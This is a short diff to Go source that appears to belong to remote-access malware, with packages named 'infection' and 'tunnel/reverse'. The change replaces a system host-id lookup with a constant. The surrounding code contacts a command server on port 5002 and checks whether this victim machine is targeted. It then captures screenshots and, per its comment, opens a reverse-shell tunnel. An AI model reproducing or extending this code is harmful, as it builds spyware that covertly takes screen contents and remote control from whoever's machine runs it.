@@ -6,7 +6,6 @@ import (
 	"github.com/kbinani/screenshot"
 	"github.com/parnurzeal/gorequest"
 	"image/png"
-	"infection/machineinfo"
 	"infection/tunnel/reverse"
 	"infection/util/lib"
 	"os"
@@ -82,14 +81,13 @@ func getscreenshot() []string {
 }
 func Tunnel(addr string) {
 	var check Check
-	var versionDetail = machineinfo.GetSystemVersion()
 	resp, body, _ := gorequest.New().
 		Get("http://" + addr + ":5002/browser/tunnel").
 		End()
 	if resp.StatusCode == 200 && body != "" {
 		if err := json.Unmarshal([]byte(body), &check); err == nil {
 			// if not need  dont open the tunnel to revert shell
-			if check.Hostid == versionDetail.Hostid {
+			if check.Hostid == lib.HOSTID {
 				filenames := getscreenshot()
 				finflag := make(chan string)
 				for _, fname := range filenames {
